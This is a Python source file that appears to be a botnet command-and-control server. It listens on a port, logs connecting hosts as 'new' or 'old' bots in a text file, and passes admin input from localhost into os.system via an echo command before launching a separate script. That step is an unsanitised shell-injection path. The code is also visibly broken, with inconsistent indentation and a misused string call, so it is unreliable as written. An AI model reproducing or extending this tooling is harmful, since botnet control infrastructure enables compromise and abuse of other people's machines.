import socket
from colorama import Fore, Back, Style

import sys
import os
import time
import socket
import random
#Code Time
from datetime import datetime

sock = socket.socket()

sock.bind(('', 12456))
print('Server port: 12456')
sock.listen(10000)

while True:

  conn, addr = sock.accept()

  print(Fore.GREEN + ' [!] Connection:' + Fore.BLUE , addr)

  f = open("bot_list.txt", 'r')
  text = f.read()
  f.close()

  comaddr = str(addr)
  con = comaddr.split()

  if con[1] == "('127.0.0.1',":


     print(Fore.CYAN + " [•] " + Fore.YELLOW + "Admin")
     try:
       data = conn.recv(1024).decode()
       print(data)
      iuf = str.replace('d', '', 1)
      slp = 'echo '+iuf+'>ip.txt'
      os.system(slp)
      os.system('python3 mem.py')
      
     except:
       pass
       if not data:
        conn.send(data.upper())
        conn.close()
  if con[0] in text:
    print(Fore.CYAN + " [+] " + Fore.MAGENTA + "Old bot")
    print("")
  else:
    f = open("bot_list.txt", 'w')
    f.write(con[0] + '\n')
    f.close()
    print(Fore.CYAN + " [+] " + Fore.BLUE + "New bot!!!")
    print("")
    data = conn.recv(10240)
    print(data)
    if not data:
      conn.send(data.upper())
      conn.close()
